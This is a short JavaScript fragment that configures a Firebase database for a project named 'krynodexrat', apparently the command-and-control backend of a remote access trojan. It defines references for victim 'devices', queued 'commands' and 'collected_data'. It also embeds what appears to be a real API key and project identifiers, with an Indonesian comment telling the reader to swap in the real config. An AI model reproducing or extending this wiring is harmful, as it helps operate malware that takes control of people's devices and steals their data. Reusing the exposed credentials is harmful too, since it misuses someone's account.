// ⚠️ GANTI DENGAN CONFIG FIREBASE ASLI!
const FIREBASE_CONFIG = {
  apiKey: "AIzaSyBvlhJRWV8PIH09bHKdUpQKv4x6mT9wCIE",
  authDomain: "krynodexrat.firebaseapp.com",
  databaseURL: "https://krynodexrat-default-rtdb.firebaseio.com",  // ← TAMBAHKAN INI
  projectId: "krynodexrat",
  storageBucket: "krynodexrat.firebasestorage.app",
  messagingSenderId: "465327768431",
  appId: "1:465327768431:web:3e5871b9f80dcbcad1de9a"
};

// Initialize Firebase
firebase.initializeApp(FIREBASE_CONFIG);
const db = firebase.database();

// References
const devicesRef = db.ref('devices');
const commandsRef = db.ref('commands');
const dataRef = db.ref('collected_data');
